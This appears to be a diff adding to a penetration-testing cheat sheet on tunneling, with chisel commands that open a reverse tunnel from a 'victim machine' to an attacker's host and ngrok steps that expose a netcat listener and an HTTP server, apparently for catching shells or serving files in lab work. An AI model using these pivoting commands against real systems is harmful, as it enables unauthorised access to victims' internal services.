@@ -34,10 +34,34 @@ Please make sure both are the same version. Please download the latest release o
 https://github.com/jpillora/chisel/releases
 
 ```
+#On Our Machine
+./chisel server -p 4442 -v -reverse
 
+#On Victim Machine
+chisel64.exe client 10.10.14.8:4442 R:8200:127.0.0.1:8888
 ```
 
 ## Ngrok 
+
+1. Sign Up - https://dashboard.ngrok.com/
+
+2. Download suitable ngrok for your OS
+
+3. unzip /path/to/ngrok.zip
+
+4. ./ngrok authtoken <AUTH-TOKEN>
+
+```
+#TCP
+./ngrok tcp 9001
+
+-> Then nc -lnvp 9001
+
+#HTTP
+./ngrok http 9001
+
+-> Then python -m SimpleHTTPServer 9001
+```
 
 
 # References 
